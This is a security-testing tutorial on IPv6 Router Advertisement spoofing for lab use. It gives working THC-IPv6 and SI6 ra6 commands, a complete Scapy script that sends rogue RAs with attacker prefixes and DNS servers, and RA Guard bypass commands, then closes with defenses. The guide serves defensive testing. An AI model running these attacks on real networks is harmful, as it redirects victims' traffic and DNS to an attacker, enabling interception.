# How to Perform Router Advertisement Spoofing in Lab Environments

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: IPv6, Router Advertisement, Spoofing, Security Testing, Lab, SLAAC

Description: A guide to performing Router Advertisement spoofing attacks in authorized lab environments to test RA Guard effectiveness and IPv6 SLAAC security.

Router Advertisement (RA) spoofing is one of the most impactful IPv6 attacks on local network segments. A rogue RA can give every host on a segment a new default gateway, new DNS servers, and a new IPv6 prefix - all controlled by the attacker. This guide demonstrates the attack for authorized security testing.

**Warning**: Only perform in isolated lab environments with explicit authorization.

## What RA Spoofing Achieves

A malicious RA sent to `ff02::1` (all-nodes multicast) can:
1. Override the legitimate default gateway
2. Announce a new IPv6 prefix (causing SLAAC misconfiguration)
3. Announce attacker-controlled DNS servers (via RDNSS option)
4. Set router lifetime to 0 when spoofing a router's link-local source address (remove that router from victims' default-router lists)

## Method 1: fake_router6 (THC-IPv6)

```bash
# Announce attacker as default router with new prefix

sudo fake_router6 eth0 2001:db8:dead:beef::/64

# Add a hop-by-hop extension header while advertising the same prefix
sudo fake_router6 -H eth0 2001:db8:dead:beef::/64

# Use the THC kill helper to send zero-lifetime RAs for observed routers
sudo kill_router6 eth0 '*'
```

## Method 2: ra6 (SI6 Networks Toolkit)

```bash
# Send RA with attacker-controlled prefix
sudo ra6 -i eth0 \
  -P 2001:db8:dead:beef::/64#LA \
  --lifetime 3600 \
  -N 3600#2001:db8::53

# Send to all-nodes multicast
sudo ra6 -i eth0 -d ff02::1 -P 2001:db8:dead:beef::/64#LA

# Continuous RA to maintain control
sudo ra6 -i eth0 -d ff02::1 \
  -P 2001:db8:dead:beef::/64#LA \
  -N 3600#2001:db8::53 \
  --loop --sleep 30
```

## Method 3: Scapy RA Construction

```python
from scapy.all import *
from scapy.layers.inet6 import *

iface = "eth0"
attacker_mac = get_if_hwaddr(iface)

ra = Ether(src=attacker_mac, dst="33:33:00:00:00:01") / \
     IPv6(
         src="fe80::1234",
         dst="ff02::1",
         hlim=255
     ) / \
     ICMPv6ND_RA(
         chlim=64,
         M=0, O=0,          # SLAAC mode (no DHCPv6)
         routerlifetime=3600,
         prf=1               # High preference
     ) / \
     ICMPv6NDOptPrefixInfo(
         prefixlen=64,
         L=1, A=1,
         validlifetime=86400,
         preferredlifetime=14400,
         prefix="2001:db8:dead:beef::"
     ) / \
     ICMPv6NDOptRDNSS(
         lifetime=3600,
         dns=["2001:db8::53"]
     )

# Send continuously
sendp(ra, iface=iface, loop=1, inter=30)
```

## Verifying RA Spoofing Impact

```bash
# On victim host: check if rogue route appeared
ip -6 route show default

# Check if victim configured SLAAC address from attacker's prefix
ip -6 addr show | grep 2001:db8:dead:beef

# Check if DNS changed to attacker's server
cat /etc/resolv.conf
# or
resolvectl status | grep "DNS Servers"
```

## Testing RA Guard Bypass

Older or naive RA Guard implementations can be bypassed with extension headers:

```bash
# Fragmented RA test case (legacy/non-RFC 6980 targets; modern hosts should ignore it)
sudo ra6 -i eth0 --frag-hdr 80 -P 2001:db8:dead:beef::/64#LA -d ff02::1

# RA with hop-by-hop header (bypass type-based RA Guard)
sudo ra6 -i eth0 --hbh-opt-hdr 8 -P 2001:db8:dead:beef::/64#LA -d ff02::1
```

## Validating RA Guard Configuration

After testing, verify RA Guard blocks the rogue RAs:

```bash
# Monitor for RA acceptance on victim
watch -n 2 'ip -6 route show default'

# Monitor NDP traffic
sudo tcpdump -i eth0 -n 'icmp6 and ip6[40] == 134'
```

## Defenses

```bash
# Drop RA packets that fail the required hop-limit check (host-based)
sudo ip6tables -A INPUT \
  -p icmpv6 --icmpv6-type router-advertisement \
  -m hl ! --hl-eq 255 \
  -j DROP

# The legitimate RA from your router will have hop-limit 255
# Spoofed RAs from off-link sources will have lower hop-limit
# This does not stop on-link rogue RAs; use RA Guard or source allow-lists for that.
```

| Defense | Notes |
|---|---|
| RA Guard (RFC 6105; RFC 7113 guidance) | Configure on all managed switch ports |
| SEND | Cryptographic RA signing |
| ip6tables | Host-level RA filtering |
| NDPMon | Alerts on new routers |
| radvd monitoring | Detect competing RA sources |

RA spoofing testing reveals whether your network's switch-level RA Guard is actually enabled and effective - a critical control for any IPv6 network.
